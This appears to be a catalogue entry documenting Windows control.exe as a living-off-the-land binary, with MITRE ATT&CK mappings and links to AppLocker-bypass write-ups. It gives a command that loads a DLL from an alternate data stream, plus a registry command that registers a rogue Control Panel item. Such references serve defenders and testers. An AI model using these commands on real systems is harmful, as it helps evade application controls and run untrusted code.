## Control.exe

* Functions: Execute, Read ADS

```
control.exe c:\windows\tasks\file.txt:evil.dll
```

Acknowledgements:
* Jimmy - @bohops

Code sample:
* 

Resources:
* https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/
* https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/
* https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/
* https://twitter.com/bohops/status/955659561008017409

Full path:
```
C:\Windows\system32\control.exe    
C:\Windows\sysWOW64\control.exe     
```

Notes:
Add registry in HKCU\Software\Microsoft\Windows\currentversion\controlpanel\CPLS to manipulate.
```
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls"
/v EvilCPL.cpl /t REG_SZ /d "C:\Folder\EvilCPL.cpl"
```

 MITRE ATT&CK:
* [Control Panel Items](https://attack.mitre.org/wiki/Technique/T1196)
* [NTFS File Attributes](https://attack.mitre.org/wiki/Technique/T1096)
